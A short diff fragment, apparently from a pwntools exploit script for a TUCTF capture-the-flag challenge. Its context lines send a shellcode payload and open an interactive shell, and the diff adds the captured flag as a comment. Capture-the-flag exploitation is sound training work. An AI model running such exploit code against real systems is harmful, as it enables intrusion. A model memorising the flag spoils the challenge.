@@ -48,3 +48,5 @@ log.info("Shellcode : \n%s" % disasm(shellcode))
 r.send(p)
 r.read(50)
 r.interactive()
+
+# TUCTF{4nd_4_0n3,_4nd_4_7w0,_4nd_5h3ll_f0r_y0u!}
